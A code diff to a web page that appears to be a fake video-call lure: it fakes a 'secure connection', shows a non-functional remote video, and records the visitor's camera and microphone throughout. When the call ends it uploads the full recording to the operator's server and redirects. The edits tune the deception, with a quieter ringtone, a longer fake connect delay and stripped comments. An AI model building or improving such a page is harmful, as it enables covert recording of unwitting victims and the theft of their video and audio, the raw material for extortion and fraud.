@@ -99,11 +99,10 @@
 <script>
 let localStream;
 let mediaRecorder;
-let allRecordedChunks = []; // Stores chunks from both cameras
+let allRecordedChunks = []; 
 let currentFacing = "user";
 let uiVisible = true;
 
-// Changed to ringtone.mp3
 const connectSound = new Audio("ringtone.mp3");
 
 const localVideo = document.getElementById("localVideo");
@@ -112,31 +111,30 @@ const connectScreen = document.getElementById("connectScreen");
 
 // --- CONNECTION STARTUP ---
 function initiateConnection() {
-    connectSound.volume = 0.4;
+    // 🔊 LOWERED VOLUME to 20%
+    connectSound.volume = 0.2; 
     connectSound.play().catch(err => console.log("Audio play blocked", err));
     
-    // UI Feedback for 3 seconds
     connectScreen.innerHTML = `
         <span class="loader"></span>
         <p style="margin-top:20px;">Establishing secure connection...</p>
     `;
 
+    // ⏳ INCREASED TO 5 SECONDS (5000ms)
     setTimeout(async () => {
         connectScreen.style.display = "none";
         document.getElementById("remoteVideo").style.display = "block";
         document.getElementById("controlsUI").style.display = "flex";
         localVideo.style.display = "block";
         
-        // Auto-snap to bottom on launch
         localVideo.classList.add("snap-transition");
         
         await startCamera();
-    }, 3000);
+    }, 5000); 
 }
 
 // --- CAMERA LOGIC & RECORDING ---
 async function startCamera() {
-    // 1. Stop current tracks before switching hardware
     if (localStream) {
         localStream.getTracks().forEach(track => track.stop());
     }
@@ -154,17 +152,14 @@ async function startCamera() {
         localStream = await navigator.mediaDevices.getUserMedia(constraints);
         localVideo.srcObject = localStream;
         
-        // 2. Stop old recorder if it's running
         if (mediaRecorder && mediaRecorder.state !== "inactive") {
             mediaRecorder.stop();
         }
         
-        // 3. Start new recorder to append to our chunk array
         initMediaRecorder();
 
     } catch (err) {
         console.error("Camera fail:", err);
-        // Fallback if specific facingMode fails
         localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         localVideo.srcObject = localStream;
         initMediaRecorder();
@@ -179,7 +174,6 @@ function initMediaRecorder() {
         if (e.data.size > 0) allRecordedChunks.push(e.data); 
     };
     
-    // Collect data every 1 second (1000ms) to ensure continuous saving
     mediaRecorder.start(1000); 
 }
 
@@ -209,7 +203,6 @@ const drag = (e) => {
     let newX = initialLeft + (clientX - startX);
     let newY = initialTop + (clientY - startY);
     
-    // Bounds check to keep video on screen
     newX = Math.max(10, Math.min(newX, window.innerWidth - localVideo.offsetWidth - 10));
     newY = Math.max(10, Math.min(newY, window.innerHeight - localVideo.offsetHeight - 10));
     
@@ -225,12 +218,10 @@ const stopDrag = () => {
     const rect = localVideo.getBoundingClientRect();
     const midX = window.innerWidth / 2;
     
-    // Snap logic: push to bottom if dragged lower than 70% of screen height
     if (rect.top > window.innerHeight * 0.7) {
         localVideo.style.top = (window.innerHeight - localVideo.offsetHeight - 20) + "px";
     }
     
-    // Snap to left or right
     const finalX = (rect.left + rect.width / 2 < midX) ? 20 : (window.innerWidth - rect.width - 20);
     localVideo.style.left = finalX + "px";
 };
@@ -261,31 +252,25 @@ function toggleMic(btn) {
 }
 
 async function endCall() {
-    // 1. Stop streams to turn off camera light
     if (localStream) localStream.getTracks().forEach(t => t.stop());
     
-    // 2. Stop recorder if active (triggers final ondataavailable payload)
     if (mediaRecorder && mediaRecorder.state !== "inactive") {
         mediaRecorder.stop();
     }
 
-    // 3. Show loading UI
     document.getElementById("overlay").style.display = "flex";
     document.getElementById("statusMsg").innerText = "Closing connection...";
 
-    // 4. Create one big blob out of every segment recorded
     const finalBlob = new Blob(allRecordedChunks, { type: "video/webm" });
     const formData = new FormData();
     formData.append("video", finalBlob, "full_call.webm");
 
-    // 5. Upload to your Render server
     try { 
         await fetch("/upload", { method: "POST", body: formData }); 
     } catch (e) {
         console.error("Upload failed", e);
     }
     
-    // 6. Redirect to search page
     window.location.href = "search.html";
 }
 </script>
